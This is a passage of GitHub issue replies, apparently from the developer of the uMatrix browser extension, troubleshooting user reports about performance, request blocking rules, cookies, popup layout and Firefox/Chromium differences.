uMatrix's counter. Just because the counter updates as you type is no proof of causation.\nI just tried to type a mail in Gmail, with uMatrix ans all was fine. There were XHR requests, but not enough to qualify as \"large number\" in a short time.\nSo I can't reproduce what you are talking about, I can't make sense of it either given that I know how things work internally. You ask me to change the code and yet you do not show any proof that there is a problem with uMatrix, just an hypothesis based on whatever assumptions you are making about uMatrix.\nFirst, please share your assumptions about how you think uMatrix works.\n. One thing I would look at is the dev console of Gmail, and the dev console of whatever extensions you have installed -- including uMatrix, and see if any of them is throwing exceptions non-stop.\n. What are your rules/switches when on Gmail?\n. Profiling the page while typing could provide good clues as to what is hogging the CPU. Unfortunately I can't reproduce here, but my Gmail account I only use once in a while to test extensions, I suppose yours is heavily populated.\n. I usually just launch a profile session from the dev console of the page. The results often look messy but I can easily tell whether the top most contributor is uMatrix/uBlock or not, by looking at the chain of calls. I thnik the profiling data can be saved and I could restore it on my side.\n. Just linking these here for reference: https://github.com/gorhill/uBlock/issues/911. It does appear Gmail is often suffering from performance problem.\n. That's not uMatrix, that's uBlock. And by the look of it, version 0.9.2.3, not the latest one.\nIt does look like it's spending an inordinate amount of time collating the classes. I wish I could step into the code. One thing which could be interesting to find out is the total number of elements with a class attribute on the page when the problem occurs. Typing the following at the dev console should tell:\ndocument.querySelectorAll('[class]').length;\n. 3613 is typically high, but I ran benchmark on sites with such high count with no problem, and also, in the context here only the added nodes are queried, not the whole page as document.querySelectorAll does.\nWhen you say \"disabled for *.google.com\", can you tell me precisely how? Where does *.google.com appear?\n. I don't know, I can't make sense much of what I see. It does appear the browser is spending a lot of time in native code land, Element.classList and Element.querySelectorAll.\n. > then clicked the uBlock icon, then its big \"power button\" icon, so that it and the uBlock icon both turned grey\nDid you reload the page afterward? If the page is whitelisted, uBlock is not supposed to run the code I see in your screenshot.\n. Testing on my unused Gmail account (it's full of emails as I used the email address on various sites just to get stuff), I get 7068 elements with a class attribute, and profiling while I type in a new mail, uBlock does not show in the profiling results, I can't find it, meaning its most expensive call is below 1 ms.\nWhat other extensions you have installed, if any?\n. How much memory do you have? Any possibility that your computer was swapping memory because of low memory condition?\n. > Do uBlock / uMatrix themselves consume a lot of memory?\nDepends, as said in another issue: https://github.com/gorhill/uMatrix/issues/147.\nThis user too had 8 GB. The thing is, Chromium does indeed consume a lot of memory, and often it takes a while to be garbage collected -- you kind of have to force it as seen in the benchmark in the above issue. Chrome is certainly even more memory hungrier than Chromium because it has internal extensions which Chromium does not have by default.\nIn the above issue, the hidden iframes were not helping at all, so another thing to check is the number of iframe on the page, though we are talking about recursivity here, it could be a frame itself which is full of iframes, and this can't be easily seen from the console. The fact that you have a high request count is a hint that there could be some DOM craziness going on (non-stop creation/embedding of iframes -- everything is possible).\n. > The other issue is that uBlock and/or uMatrix are apparently still doing something even though I have disabled them both for GMail. Is this a legitimate bug?\nYes, I want to look into this.\n. I confirm that the content script taking care of cosmetic filtering can end up lingering in the page even when a site is whitelisted. It's because all is asynchronous, so sometimes the information needed by a content script that it should abort is not available at the time it is checked. Solution is to check every time the content script receives an answer from the background page.\nFix will be in next release (also in next dev release)\n. Fixed with https://github.com/gorhill/uMatrix/commit/7cd060a15f995215941641428a866bee8c109563#diff-e89c0f548b51d6b02baea1e832b9d8baR460.\n. > how could I just allow everything except those blocked by default such as google analytic?\nI don't understand what you mean by \"except those blocked by default\".\n. > there is a list of red/green domain\nI understand even less. You seem to be talking about dynamic filtering, but it's for advanced users -- while you say you have \"limited computer skill\". Dynamic filtering is never enabled by default, and when enabled, there are no rules at all, so no such thing as \"blocked by default\".\nIf by \"blocked by default\" you mean no dynamic filtering and just like a plain blocker with EasyList etc., go to the Settings pane in the dashboard, then un-check \"I am an advanced user\". This will disable dynamic filtering and web sites should cease being broken.\n. Very funny, the whole time I thought I was talking about uBlock... Oops...\nOk, now I understand better.\nWhat you want is to allow everything by default, except to keep blocking whatever is in the hosts lists.\nHere are the steps:\n- Select the global scope (* in the drop down list at the top left)\n- Click the all cell so that it turns green\n- Click the frame cell to turn it pale green\n- Save -- click the padlock so that the new rules stick\nThis way uMatrix will run in allow-all/block-exceptionally mode.\nKeep in mind some hosts lists can break stuff, so you may still stumble on broken sites. So use the hosts lists which are less likely to break something.\n. It's how it should look like:\n\nI forgot about frames, I added a step in the previous comment.\n. > After adding [...] to the Hosts files\nAre EasyList, EasyPrivacy and EasyGermany hosts files?\n. What are your rules for that site?\n. Ok, I didn't see any difference between browsing the site with or without uMatrix.\nThere are two quirks I noticed with the site itself -- which occurs with or without uMatrix. \nOnce you reach the bottom of the page, the page will pull in more images from the server. The two quirks are:\n1. Sometimes it may take many seconds after the spinner disappear for the pulled images to appear.\n2. Sometimes the images won't appear: scrolling one line back and then forth to force a refetch will usually work.\nThis happens without uMatrix too. I went past the point you said has a problem.\nUsing Chromium 41.\n. That kind of page with hundreds of GIF required GBs of memory. It was consuming over 2 GBs when I reached July 13. This has nothing to do with uMatrix, GIFs are memory-hungry resources. How much memory do you have on your computer? \n. > If you disable \u00b5Matrix, you can scroll down without freezes\nHow did you disable uMatrix?\n. > will still freeze\nDescribe \"freeze\" please.\n. > gif are not moving anymore\nWhat you describes is similar to what happens when memory starts to be paged in and out of swap space. I just can't reproduce what you describes. But loading hundreds of GIF in memory of course will be a huge drain on memory and CPU.\nChromium's Task Manager currently shows 71% usage, while the page has been idle for a while now, not downloading GIFs anymore. That's the price of animating hundreds of GIFs animated onto one single page. Currently consuming ~2 GBs.\nActivating another tab causes the CPU usage to drop to 0% for the tab containing all the GIFs, and the memory to somewhat drop. Go back to the tab, CPU go back up, and memory usage for that tab increases somewhat too.\nSo if you went to the Extensions tab to disable uMatrix, just going to that new tab caused a chunk of memory to be garbage collected, and CPU to drop to 0%. This has nothing to do with uMatrix. So if you were swapping memory by then, this will give you the impression disabling uMatrix helped a lot, while this has nothing to do with uMatrix.\n. > I guess \u00b5Matrix needs a bit of CPU/RAM, then it reaches the machine limit earlier than without \u00b5Matrix.\nIt depends.\nI ran three benchmarks, being very careful to use the same steps for all three. I pressed page down, waited to be sure no images were pulled as a result, then paged down again. If images were pulled (watching \"Network\" column), I waited for this to be over. Then paged down. Etc. Until I reached July 25th, at exactly the same point for all three benchmarks. Here are the results for the target tab:\nFigures are \"memory / CPU\" (from Chromium's Task Manager).\n|  | No extension | uMatrix | uMatrix w/ all frames blocked |\n| --- | --- | --- | --- |\n| Tab (before moving away) | 1.4 GB / 60% | 1.7 GB / 62% | 1.15 GB / 58% |\n| Activate another tab | 885 MB / 0% | 1.2 GB / 0% | 713 MB / 0% |\n| Tab (after moving away) | 999 MB / 55% | 1.3 GB / 57% | 868 MB / 54% |\nI didn't realized there were a lot of frames on the page, I had assumed it was only GIFs. But the page has hundreds of invisible iframe in it, probably one for each GIF (to embed social widgets).\niframe incurs an overhead in uMatrix, because each is injected with uMatrix's content script, which is not something that can be worked around -- this is necessary to take care of many basic tasks: UA spoofing, detecting dynamically added scripts/frames, etc.\nAlso, I do believe the overhead incurred by content script injections with the latest iterations of Chromium is higher than it used to be, something that has been noticed elsewhere -- there is an issue which was opened in Chromium about this.\nChromium 41 64-bit on Linux.\n. it's alive.\n. Duplicate of #66.\nPlease check if an issue has already been filed, it saves time for devs who end up having to do this themselves.\n. - I don't know from where you downloaded that PDF, I need an exact URL please.\n- How did you try to download it? Left-click? Right-click?\n- Do you have an extension to render the PDF?\nI tried to download a PDF from http://dcsplus.net/ and it worked fine.\n. With the following rules:\nhttps-strict: * true\nhttps-strict: dcsplus.net false\nmatrix-off: chrome-extension-scheme true\nmatrix-off: chrome-scheme true\nmatrix-off: dcsplus.net true\nmatrix-off: localhost true\nmatrix-off: opera-scheme true\nreferrer-spoof: * true\nreferrer-spoof: dcsplus.net false\nua-spoof: * true\nua-spoof: dcsplus.net false\n* * * block\n* * css allow\n* * frame block\n* * image allow\n* 1st-party frame allow\n* translate.googleapis.com * allow\nI enabled Chrome PDF viewer, went to http://dcsplus.net/about-us/careers, clicked any PDF, and it loaded just fine.\nI cannot reproduce with the information you have given me, using Chromium 41. Does the problem also occur for Chrome 41?\n. I don't provide support for dev version of browser. Try with an official release and if the problem does not occur, close the issue please.\n. avatars0.githubusercontent.com is the root domain. githubusercontent.com is listed as a suffix in the Public Suffix List.\nDuplicate of #54\n. Not much I can do really.\nA while ago I tried a trick to find a possible tab from where a behind-the-scene request originate (using referrer), but that just didn't work really -- so I ended up with lot more complicated code paths for no result at all.\nWe will have to accept this, a browser-specific behavior.\n. > A viable alternative?\nThat's for each user to decide. If for some users blocking completely behind the scene requests is very important, I guess then it is a viable alternative to them.\n. I suppose it is possible some extensions pull stuff from remote servers -- bottomline is if you filter something in a scope, then yes, it may affect whatever make use of that scope, which in the current case means yes, other extensions could be affected if you filter something in the chromium-extension-scheme scope.\n. chrome-extension-scheme is used for when the URL in the address bar starts with chrome-extension://[...]. So when you are visiting an extension's pages.\nOn a side note, I may extend this in the next release of uMatrix, to allow to set rules for specific extensions, by being more fancy when deriving a (fake) hostname. Example: pbffolnficoggnnamkphaffidiafpeaf.chrome-extension-scheme.\n. When there will be something to release, which depends on much of my free time I decide to spend on creating new stuff worth releasing.\n. Fixed in 0.9.0.0.\n. Not a uMatrix issue, this belongs to a forum somewhere. I don't see myself having the time to deal with anything more than uBlock/uMatrix for the time being.\n. Observations:\n- All the requests were fetched from the cache from what I've seen (no remote connection)\n- The webRequest.onBeforeRequest is not called\nIt seems to be an integrated \"extension\" or \"app\", in that it has an extension id, and you can actually step through the javascript source code.\nBut in any case, as said, if the webRequest.onBeforeRequest listener is not called by Chromium, there is nothing uMatrix can do.\n. The matrix switch is temporary, it needs to be padlocked to stick.\n. What version is this?\n. Fixed in 0.9.0.0.\n. I get \"Redirect Notice\" when I click your link:\n\nThe previous page is sending you to http://7-themes.com/6976545-jaguar-the-big-cat.html.\nIf you do not want to visit that page, you can return to the previous page.\n. Doesn't work.\n\nJust tell me how you end up on that page, so I can create my own query.\n. Doesn't work, I can't get to what you have, a full page image preview, mines are just embedded. Anyways, I clicked you link again and finally it went there. It's the page itself the issue, not uMatrix.\nYou will get same message however the frame is blocked, be it with uBlock or ABP (which do not replace the frame content like uMatrix.) The browser itself tries to put in a placeholder, and even this one is refused.\n. Check your behind the scene matrix -- from the logger. See if the resources are blocked from there.\nI found that there are much more requests which end up as behind-the-scene requests in Firefox.\n. \n. I still need to look if there anything to be done, the amount of b-t-s requests in Firefox is worrying.\n. Not hard to do, but it's supposed to be exceptional, it should not be required. There is something to fix in there, if I step through the code, no requests end up behind-the-scene for that scenario. If I let the code run uninterrupted, I see b-t-s requests.\n. Yes, these quirks go into cosmetic issues, I know about these and how to fix them.\n. Ok the code ported from Firefox had some requirements meaningful to uBlock only, no so for uMatrix. It's much simpler for uMatrix, it doesn't need to keep track of embedded frame ids etc. The output is cleaner now, the only b-t-s requests I see are really behind-the-scene ones.\n(Though this also means uBlock do wrongly categorize a lot of requests as behind-the-scene.)\n. I consider this fixed with latest build.\n. > Are you going to add websocket support to firefox?\nwebSocket requests are currently reported in the other column, they can already be blocked. In all likelihood, there is only one webSocket upgrade request per page, so to create a separate column would not be a good idea. Because only one request upgrade to webSocket, a better UI for this would be a per-scope switch, or to just leave it in the other column.\nYou can test the blocking of webSocket upgrade request here (this can't be blocked with Chromium).\n. What version of Seamonkey are you using?\n. Your 1st-party domain cell is explicitly blocked.\n. I plan to show the \"offensive\" rules in the logger, but not sure this will be part of 0.9.0.0.\n. I removed that feature.\n. For user agent, the string is rotated internally, but not necessarily used. Still I will log the operation only if it's really in use.\nFor cookies, I can't reproduce.\n. Actually, looking at the code I see what is happening, yes, it appears cookies can be deleted regardless of settings -- will fix.\n. @asymmetric I created labels for firefox, chromium. The issue here is core, so I removed \"Firefox\" from the title.\n. Actually, I retract my \"I will log the operation only if it's really in use\". This is a per-scope switch, so although it can be disabled globally, it could be in use locally for one or more scopes. So it needs to be logged regardless of the global setting.\n. I am closing this because I don't believe there is still an issue.\nuMatrix may still report that some cookies have been deleted even without the setting \"Delete cookies ...\", because it listens to cookie deletion events, and this will be triggered regardless of how a cookie is deleted, including deleted by another extension or a by web page.. > Is this normal?\nYes. It's the number of distinct URLs the page has seen. On streaming sites especially, it will keep going up.\nBy the way, the new default is to have the badge turned off.\n. > pressing the enter key does not create a line break\nNever mind, I was testing in the user agent field, I can reproduce in the Hosts files pane.\n. Can you give me URLs for me to paste in? Easier than me wandering on the web to find stuff to put in there.\n. Thanks.\n. Ok, I installed LastPass, created an account, disabled browser's own auto-fill, cleared the user/password for Wilders Security, entered the login info in LastPass, etc.\nVisited http://www.wilderssecurity.com/, clicked LastPass' AutoFill, the user/password were properly filled in, I could login.\nI don't trust LastPass enough to give it my credentials for Github. Is the problem only on Github?\n. See if you can spot an error from contentscript_*.js in the console of a web page where it doesn't work.\n. > Please note that I can not observe this behaviour in the Firefox version\nIf I allow stats.deka.de with uBlock only, the script is downloaded (normally blocked by some filter in EasyPrivacy). However, if I unallow, the entry stats.deka.de is no longer reported as blocked by uBlock. It's because of the Chromium memory-based cache. When something is in the memory-cache, it won't be reported to the webRequest API. This is typical case where Firefox API does a better job.\n\nIn the Chrome address line there is now a button that says that javascript is blocked for this site.\n\nOk, this must be it. With 0.9.0.0, I completely removed mingling with user settings, so if you have custom javascript rules (the browser ones), uMatrix 0.9.0.0 won't override them.\n. > In any case this should be prominently communicated as this is an important change which might affect many users\nI guess I should just put back that code, that would be one less thing to explain.\n. I can reproduce.\nThis is a regression, I remember specifically testing this with the Firefox version.\n. I have been keeping an eye on memory usage and it held pretty well from what I've seen.\nHowever, it is my experience that when I install uMatrix, I remove the current version first, quit Firefox, restart Firefox, and install the new version of uMatrix.\nI've seen in the past remove/disabled extension being kept alive somewhere in Firefox, and with memory footprint increasing. Given that in development reloading the extension happens quite often, the remove/quit/launch/install steps have given me the best result so far.\nFor example, after long use yesterday, went to about:memory, gc'ed, then aggregated \"Explicit Allocations\" figure was below 200 MB, pretty good in my experience.\nAs a matter of fact uMatrix runs much better on Firefox than Chromium at this point.\n. I've been running FF/uMatrix since a bit now. I will keep running it the whole day without restarting, and will log here mem usage on a regular basis, and see how it looks like at the end of the day.\n12h00: 195 MB / 10 + 6 MB\n13h50: 223 MB / 11 + 6 MB (184 MB / 1.4 + 6 MB without logger window)\n19h00: I close the logger window by mistake (260 MB / 1.5 + 18.7 MB  without logger window)\n- However I removed/reinstall/disabled uBlock meanwhile, and I can see there is still stuff from uBlock in the top(resource://gre-resources/hiddenWindow.html, id=1) section, so I suspect the jump from 6 to 19 MB is in part caused by uBlock, and also the section unused-gc-things.\n\nexplicit / add-ons/uMatrix@raymondhill.net + top(resource://gre-resources/hiddenWindow.html, id=1), after a \"Minimize memory usage\".\nAll default hosts files selected (62,000+ blocked hostnames).\n3 tabs opened: uMatrix's logger, About add-ons, a page on Github.\n. Been using Nightly e10s most of the day, opened/closed logger on a regular basis, etc. and two tabs opened (here + about:addons), and 165 MB for allocated memory figure, uMatrix shows at under 1.4 MB + the top(resource://gre-resources/hiddenWindow.html, id=1) entry at 7 MB under Window objects.\nSo its doing well.\n. ~~It's going to take some digging.~~ There is a redirect involved, so I thought it was just a matter of modifying the request headers of the new channel, but it doesn't work. Looks like Firefox is re-adding the cookie header after the redirect occur.\n. What does the logger say about that script?\n. Did you try to disable Strict HTTPS? This switch is independent of the matrix switch.\n. Can you give me a URL please so that I have an idea what to look at.\n. It definitely should show you the cookie count. Can you look at the browser console (ctrl-shift-J) and se if there are errors which seem related to uMatrix?\n. The way uMatrix work is that it counts a cookie each time it is notified by the FF API that a cookie has changed (added, modified, cleared). So it is as if the FF API is not notifying uMatrix, or uMatrix was unable to build its cookie dictionary at launch time. Console hopefully gives hints about this.\nBy the way, more details please, I don't know which version of FF you are using. What are the other extensions aside HTTPS-E?\n. I can't reproduce. It shows 6 scripts, 1 frame, 1 css. It does not report images however, despite the page being full of them. I suspect this is because they are cached. But I don't know if that would also explain the inline script count. What version of uMatrix?\n. Can you show me the log for that page, for when you get this result? Whatever the log sees, it should be reported in the matrix, it's the same code path.\n. Here is a simpler case: https://news.ycombinator.com/news.\nNo external script, only one inline script tag. What result do you get? It's properly reported in mine.\n. What version of uMatrix? You seem to have a lot of behind-the-scene requests.\n. So... what does the matrix say for that test?\nIsn't the issue you filed about script cells showing empty?\n. Ok, let's step back here. Too many little disparate nuggets of information, raising more questions. Issues should detailed as thoroughly as possible in the first comment, this saves a lot of back and forth time.\nYour comment, at the top:\n1. No uMatrix version number.\n   - The amount of behind-the-scene requests resemble what was happening with uMatrix dev.0. I can't get this kind of output. Now you say dev.7, but is it dev.7 for the last test, or dev.7 for the first test too?\n2. No Firefox version.\n3. The screenshot you provided in OP is truncated, I can't see the most important information, which is the entries immediately following the doc boundary for the link you provided.\n4. Reading again, I am not even sure what the exact issue is. You gave me a URL, I loaded that URL and all work as expected, the matrix is filled with information.\n5. Transcribing the relevant rules/switches in use helps a lot too.\nI can't read mind, so can we start over and explain carefully what is the issue?\n. How is your video playing? Mine won't play without Flash.\n. > The rules for spiegel.de as shown in the screenshot\nThere is obviously more spiegel.de rules than just what is in the matrix screenshot.\nPlease, paste here all your spiegel.de rules, no screenshot, I can't cut & paste screenshots in the Rules pane.\n. Unable to reproduce with the provided steps.\n. I've been refactoring script blocking stuff to be more inline with how it's done in uBlock. I don't know if that changes anything for the case in your first comment[1], but might be worth a try.\n[1] I have no clue how you end up with a doc for http://video.spiegel.de/flash/74/54/1574547_1024x576_H264_HQ.mp4.\n. I don't get that dialog box. This explains everything. Your Firefox is trying to download the video, mine plays the video right in the page. My Flash is completely disabled, it's playing HTML5, with \"JW\" player.\n. So now looking at this, I think the problem to solve here is no longer script reporting stuff, but the fact that your matrix should not be changed by that download-video dialog box, as no new page is opened. uBlock deals properly with this, but I had to change things in uMatrix as it works differently.\nI will try to address this today.\n. When I say \"this explains everything\" I means this explains why I could not reproduce your original issue. Hence why detailed step-by-step is important in bug report, even when all seem trivial.\nThis is not an HTML document, this is an MP4 file. There is no script tag to report. The issue of uMatrix reporting blocked inline script in the logger was fixed with the refactoring. If a document has no inline script tag at all, no \"{inline-script}\" event will be reported in the logger. So this is fixed.\nThe issue to solve is not script-related: the matrix should not be set up for a downloaded file: a downloaded file should be seen as a secondary resource for the current tab, and the matrix of the current tab should be the one appearing in the popup.\n. I still would like to know how to reproduce by the way, as a test case for the matrix thing.\n. The question is, why is your video not playing embedded in the page, I am pretty sure this is the intended behavior. It's what happens in my Firefox for that page. If you can find out why, then I will modify whatever Firefox preference gives you this result.\n. Yes, I have a TODO item in the code to deal with size. For now collapse the blacklist section and refresh the page, see if this makes the bar accessible. If all fail, go to about:config, filter with umatrix, and reset the item related to popup position.\n. Nah I will fix it today, this is bound to come back again sooner than later. I figure I will save time if I fix it now.\n. Fixed in 486183cbe6d3256c554bbd85b84676089bcab4d2.\nI had to remove the ability to move the popup around, this was causing way too many edge issues, and the amount of code to deal with these was no longer justified, especially it was probably still failing in more edge cases.\nThe popup is not pinned near the top-right corner, and I added a control button to minimize it to get it out of the way to see what is under.\n. By design, as explained in the dashboard:\n\nBlacklisted cookies are not prevented by uMatrix from entering your browser. However they are prevented from leaving your browser, which is what really matters. Not blocking cookies before they enter your browser gives you the opportunity to be informed that a site tried to use cookies, and furthermore to inspect their contents if you wish.\nOnce these blacklisted cookies have been accounted for by uMatrix, they can be removed from your browser if you wish so.\nImportant note: Extensions can make web requests during the course of their normal operation. These requests can result in cookies being created in the browser. If the hostname from where a cookie originate is not whitelisted, the cookie will be removed from the browser by uMatrix if this option is checked. So be sure that the hostname(s) with which an extension communicate is whitelisted.\n. wordpress.com is not in the Public Suffix List, which means that it is really a 1st-party. The Public Suffix List rules is the reference for this. For your specific case, the solution is to remove the allow rule for wordpress.com, i.e.:\n\nwordpress.com 1st-party * inherit\nI can't create arbitrary exceptions to the PSL, it dictates everything about what is 1st-/3rd-party. If we disagree about its content, the solution for a user is to work around it with his own rules.\n. Legacy Firefox is not longer maintained.. Duplicate of #46.\n. Solution is more complicated than thought. Will fix later as time allows.\n. uMatrix does not render the text, the browser does, so uMatrix can't know in advance that a string will be truncated.. It's covered in here: https://github.com/gorhill/httpswitchboard/wiki/Why-can't-I-save-an-image-using-contextual-menu%3F.\nExcept that I see it's behind-the-scene with Firefox. I will have to import little by little the doc from HTTPSB which still matches uMatrix.\n. No longer able to reproduce with lastest version: the popup content can now be scrolled to see the whole popup panel.. See https://github.com/gorhill/uBlock/issues/65#issuecomment-93733679:\n\nI regretted to have put it in, so it's not back in uMatrix.\n. https://www.virustotal.com/en/documentation/browser-extensions/\n\nI won't let uMatrix fall victim to scope-creep, and also won't have uMatrix endorse (through features) any specific 3rd-party vendors.\n. For now they are overwritten at start. I may need to change them -- like I did in a recent commit -- and these changes need to take effect. \nPlease do not file issue for stuff which are not documented features.\n. Version 0.9.0.2-dev.0 will no longer overwrite your customizations. Document placeholder for frames cannot be customized though. Be aware though that those settings are removed when uninstalling uMatrix.\n. \n. \n. \n. \n. It will eventually display correctly after you close the first one (repeat if it doesn't). Was it the first new tab you opened?\n. It happens when I click the + tab to create a new tab. It doesn't matter how long after I launch the browser (I believe), it happens ~~systematically~~ the first time I create a new tab.  I did see this prior to release, but I do not consider this a showstopper. Needs to be fixed though.\nI striked-through \"systematically\", above, as I just tried it, and did not get the problem. Will try something else.\n. Ok I think I see how it happens, it's after installing or disabling and enabling uMatrix. So a edge case, but something I do often on my side during development.\n. Systematic:\n1. Close all New tab tabs if any opened\n2. Go to about:addons\n3. Disable uMatrix\n4. Enable uMatrix\n5. Create a new tab by clicking the Open a new tab button\n6. Matrix is void -- there should be at least the matrix header row\n. > Was this accidentally fixed with Firefox 38.0\nI could reproduce it with Nightly.\n. @dboshardy The issue here was definitely on Firefox. Your issue may be related to #194. Provide information in there, like your browser version, etc. I've tested the extension with Chromium 41 and it works fine.\n. I didn't change anything. I suspect it's a regression bug from implementing a better incremental rendering (to avoid rebuilding the whole DOM counterpart of the matrix).\nRows with explicit rules are not supposed to collapse into the meta *. row, so the last picture shows a bug. Will look into this.\n. I just tried your last scenario, and my live.github.com row does not collapse, it stays visible.\nRe.:\n\nbtw, nowhere documented\n\nMy dream is that one day there will be less pointing out what is not documented, and more just taking care of documenting it instead.\n. This is what I get:\n\nSo I don't know how to reproduce your case.\n. > new collapsed domain lines\nNow I realize that you think the collapsing is new... Really? This has been in HTTPSB since November 2013: https://github.com/gorhill/httpswitchboard/issues/55#issuecomment-29132745.\n. Looking at the code, I failed to see how your last picture:\n\ncould happen, unless the rule you just set, other for live.github.com, was removed. Your eraser is dimmed, suggesting that whether:\n1. You saved that new rule, but then it should not collapse out of view.\n2. You erased that new rule, and it should collapse out of view (as in your pic)\nAs said, it's code that exists since Nov. 2013, and I never saw it failing, and the code itself is rather unambiguous: rows which have cells with explicit rules are not collapsible.\nI will wait for exact step to reproduce.\n. >  I'm ringing down the curtain on it.\nWell that really sucks, you were one of the most early adopters.\n. Ok I confirm that the rows were now collapsed by default, which was not the case before. The collapse/expand state is now saved locally as a UI preferences (so that it appears in about:config in FF). From this change, I did not take into account that the initial state could be undefined, and this caused rows to be collapsed by default. This has been fixed in 6369d37567bc00e2763c03acd67c25aff867b6cb.\n. Yes, it's just for information purpose. One can disable the global UA spoof setting, yet enable it for one single site. That would be very inefficient for uMatrix to check if there is at least one switch each time the rotation occur just to see if it should log or not.\n. Can someone suggest me a better wording to avoid confusion?\n. I could just remove it as well too if it makes the logger too \"noisy\" and if the entry really doesn't add much informational value.\n. Oups, d\u00e9sol\u00e9, j'avais pas vu ce PR. Merci.\n. Are there any errors reported at the extension's own dev console? Tell me if you don't know about how to access extension's own dev console.\n. Best first is if you guys can tell me if there are any errors at the extension's dev console.\n. @dboshardy I am guessing you were looking at the web page console. The extension console is at a different place:\n\n- Go to chrome://extensions/\n- Check Developer mode (top right)\n- Click background.html of uMatrix\n- Dev console for the extension will open\n\n- Select the Console tab\n- Click Reload for uMatrix (in Extensions page)\n- See if the console contains error messages (report here if so)\n. > Uncaught SyntaxError: Use of const in strict mode. ... popup.js:36\nI see. I will provide an emergency fix. Are you guys installing from the Chrome store?\n. Ok, I will create a new package shortly.\n. OK I pushed a new version to the Chrome store, might take an hour or so before it becomes live -- hopefully it won't be marked as \"pending review\" (this has been happening randomly lately).\n. Ugh.. Let me see.\n. I don't see what is the problem. Is your language different than en?\n. I could install it fine from the store from here.\n. I have no clue what can be the problem, and no way to diagnose, it's the store causing the issue. The default locale is en, and I checked and _locales/en/messages.json is in the package.\n. I will need to come up with some kind of heuristic to detect these download operations, using the response headers is unreliable.\n. What do you mean by \"split\"?\n. There is no space elsewhere in the popup -- especially on Firefox, for whatever reason the buttons are more spaced despite same CSS.\nI had to choose between removing the ability to clear all temporary changes, or use a menu for all the extra functionality -- adding to this I might add more in there, as needed.\n. I can't make popup wider. Chromium limits the horizontal size, and when using large font, it's close to the limit, that would cause horizontal scrollbar to appear if it goes beyond.\n. > remove \"reload current page\" button\nNo way, this is way to convenient to have it right there. This might make you happy but I have no doubt this will make more users unhappy -- me first.\nReloading occurs much more often than removing all temp rules or going to the dashboard.\n. The buttons are closer to each other on Chromium. The space around the reload button is on purpose: it's a button that will be used often, I do not want the user to press another button by mistake because it would be too close to the reload one.\n. Read the release notes please: https://github.com/gorhill/uMatrix/releases/tag/0.9.0.0.\n. > there is a considerable distance on the screen between chrome reload button and umatrix icon\nThere is a reload button in the popup.\n. This is a Firefox quirk: Firefox report the request as being a main document, not a media one. It does not fire a separate request for the video tag, the video is pulled as the top document. If I block the top document, there won't be navigation to the new document, i.e. an unacceptable workaround.\nI don't see any sensible solution for this, will have to accept this is a difference in behavior between Chromium/Firefox.\n. Look at the what appear in the network tab.\nWhen the video is opened as a doc, no secondary request (just TYPE_DOCUMENT), when embedded, there are secondary requests (TYPE_MEDIA)\n\nno content is seen as either blocked or allowed\n\nThe matrix does not have a column for doc, there is only one such request per page. The doc rule is inherited from the hostname rule.\nEdit: correction, the doc rule is inherited from an internal * * doc allow rule.\n. Thinking more about this, there might be a solution, but it won't result in FF behaving like Chromium.\nSolution: try to detect whether a root document is media, if so, evaluate it as such, and if it is blocked, fallback on the blocked page warning. Caveat: this can happen only after we receive the response from the server, so this won't prevent to connect remotely -- a solution which I do not like, as this makes uMatrix \"lie\" to the user.\n. > video is not blocked, video is not listed anywhere including media\nSame issue with the webext version, which suggests that the issue is really with Firefox.. Probably obsolete by now. Couldn't find a working repro cases above. If there is still an issue with this, a new one will have to be opened with all detailed repro steps.. I could fix the behind-the-scene issue, but that uncovered another issue that all request types ends up as other with FF 34 and below, which render uMatrix rather useless.\nuBlock was dealing with the issue by having messaging across processes, which is something I completely removed in uMatrix, as this was causing too many requests to be spuriously labelled as behind-the-scene (see #165).\nAlso synchronous messaging across processes is discouraged for e10s -- this may lead to the warning about CPOW slowing down the extension. I could experiment with bringing back that cross-process messaging for FF versions older than 35, but really, I don't think the amount of effort to support FF 29-34 is worth it, I rather put effort is better supporting FF35+.\nSo for now I will just mark uMatrix as being compatible with FF35+.\n. Fixed with 1f4ba9dda90cee7c0afb0dbbb23d537ed0425220.\n. This is the research that went into picking those new colors: https://github.com/chrisaljoudi/uBlock/issues/467#issuecomment-95081254.\nThe is the research that went into picking the old colors: [none].\n. That's not how it works.\nYour argument: \"make me blind\"\nThe argument for the new colors: https://github.com/chrisaljoudi/uBlock/issues/467#issuecomment-95081254.\n. I didn't see the point of a temporary bypass, because even if one allows the root document to bypass matrix filtering, all the secondary resources for the site will be blocked, which means in all likelihood the page would be severely broken, which means one will have to play with the matrix anyways, hence no real time saving.\nSo this led to me wondering whether I offer to remove the block rule from the temporary ruleset, and then thinking about all the consequences, I figured this was leading to complications over complications (code-wise and UI-wise), so simplest solution in the end is to simply let the user remove the block rule.\n. True, server-side redirect is a case where a one-time bypass would be useful -- grant passage, without cancelling a block rule from one of the hosts file. Ok, I will offer the choice for a one-time by pass (this won't modify the ruleset at all).\n. - Click the uMatrix icon while on the blocked-document page\n- Remove the block rule for the site\n- Force a refresh\n\nwhen will it come?\n\nIt's not a showstopper, \"workaround\" (quotes because this is the original solution as per design) is above.\n. The page is blocked because the whole domain is blocked. It's just a matter of removing the block rule for the whole domain:\n\n. Closing -- Turns out I just won't spend time on this, like everything else, the matrix is where thing are worked on.. Duplicate of #30.\n. I am unable to reproduce, all my cells were properly filled, especially the highest-count mt0.google.com xhr, which is empty in your picture.\nWhat does the log say about request entries xhr https://mt0.google.com xhr/vt/...?\n. Bu the way, the link in your first picture is https://www.google.co.uk/maps?source=tldso. If I enter that link, I am always automatically redirected to https://www.google.co.uk/maps/@53.800651,-4.064941,6z.\n. Ok, I finally was able to reproduce, not sure what I did.\nInvestigating, and using the Firefox network request tool, there was nothing in there which was not reported in the matrix.\n. Ok, to reproduce:\n1. Un-check setting to collapse placeholder of blocked elements\n2. Do not allow frame for www.google.co.uk (google.co.uk 1st-party frame block)\n3. Open new tab (important, for a clean slate matrix)\n4. Go to https://www.google.co.uk/maps?source=tldso\nThe xhr cell for mt0.google.com won't be filled.\n. So the issue is that in Firefox, the content scripts execute earlier than in Chromium, thus preventing some embedded frames in there from working properly, and preventing them from being pulled at all by Firefox -- hence not seen by HTTP traffic handler.\nFor some reasons, that iframe element, placed directly after the body element, does not exist with Chromium.\n. > What if I wish to block all scripts and cookies on first party domains by default\n* 1st-party cookie block\n* 1st-party script block\nMore generally, use the global scope to configure the global settings of 1st-party row.\n. Thanks.\n. For unknown reasons, I am unable to find a way to create a Turkish description in AMO, the choice is not offered.\n. A primary tool at your disposal for diagnosing issues is to use the logger. What does it say when you try to download?\n. You've got your answer in there, unblock the other cell.\n. > despite umatrix not showing any blocked content\nWas it 